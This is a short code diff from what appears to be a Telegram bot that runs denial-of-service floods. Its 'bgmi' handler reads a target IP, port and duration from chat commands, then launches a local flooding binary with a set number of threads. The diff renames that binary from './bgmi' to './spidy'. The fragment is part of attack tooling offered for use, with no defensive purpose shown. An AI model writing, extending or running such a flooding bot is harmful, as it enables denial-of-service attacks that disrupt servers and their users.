@@ -158,7 +158,7 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     port = context.args[1]
     duration = context.args[2]
 
-    flooding_command = ['./bgmi', target_ip, port, duration, str(DEFAULT_THREADS)]
+    flooding_command = ['./spidy', target_ip, port, duration, str(DEFAULT_THREADS)]
     await update.message.reply_text(f'Flooding parameters set: {target_ip}:{port} for {duration} seconds with {DEFAULT_THREADS} threads.')
 
 
